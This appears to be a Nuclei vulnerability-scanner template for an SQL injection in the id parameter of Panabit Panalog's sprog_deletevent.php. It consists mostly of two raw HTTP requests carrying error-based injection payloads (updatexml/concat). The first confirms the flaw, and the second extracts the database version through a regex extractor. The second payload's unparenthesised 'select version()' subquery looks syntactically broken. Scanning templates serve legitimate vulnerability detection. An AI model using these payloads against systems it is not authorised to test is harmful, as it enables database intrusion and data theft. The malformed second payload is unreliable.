id: panabit-sprog-sql-injection
info:
  name: Panabit Panalog sprog_deletevent.php SQL Injection
  author: ProjectDiscoveryAI
  severity: high
  description: |
    The id parameter of the /Maintain/sprog_deletevent.php file in Panabit Panalog is vulnerable to SQL injection, allowing attackers to extract database information.
  reference:
    - http://www.panabit.com/
  classification:
    cvss-metrics: 3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 8.2
  tags: sqli,database
http:
  - raw:
      - |
        GET /Maintain/sprog_deletevent.php?openid=1&id=1%20or%20updatexml(1,concat(0x7e,md5(5)),0)&cloudip=1 HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
        Accept-Encoding: gzip, deflate
        Connection: close
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "e4da3b7fbbce2345d7772b0674a318d"
  - raw:
      - |
        GET /Maintain/sprog_deletevent.php?openid=1&id=1%20or%20updatexml(1,concat(0x7e,select%20version()),0)&cloudip=1 HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
        Accept-Encoding: gzip, deflate
        Connection: close
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: regex
        part: body
        regex:
          - "'~([^']+)'"
    extractors:
      - type: regex
        part: body
        regex:
          - "'~([^']+)'"
        group: 1
